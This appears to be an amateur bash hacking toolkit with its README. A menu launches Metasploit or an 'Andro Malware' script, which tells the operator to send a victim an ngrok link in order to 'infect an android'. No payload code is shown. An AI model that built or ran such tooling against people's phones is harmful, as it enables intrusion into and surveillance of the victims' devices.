#!/bin/bash
figlet Aryabhatta
echo " Coded by:- Hrishikesh "
echo " (+) Choose the following "
echo " 1 Run metasploit "
echo " 2 Infect an android "
echo " 3 about "
read ch
if [ $ch -eq 1 ];then
        echo " (+) Running msfconsole "
         msfconsole
        exit
    elif [ $ch -eq 2 ];then
        echo " (+) Opening Andro Malware"
bash andro.sh
        exit
    elif [ $ch -eq 3 ];then
        echo " (+) Loading about "
     cat README.md
        exit
fi

#!/bin/bash/
figlet Andro-Infect
echo " (+) Send this link to the user link:- https://ngrok.demo.com "
echo " This script is for educational and research purposes only. I'll not be responsible for any misuse caused by you 
so use at your own risk "


figlet Installing

echo " (+) installing all files please be patient "

apt-get update
apt-get upgrade
bash test.sh






date created:- 13/12/2021 (this is my first script made of bash language )

Hey Thanks for downloading our script.

    This is a simple help full script 
made by me with bash language.

if you find error please execute install.sh first 
      happy hacking :)







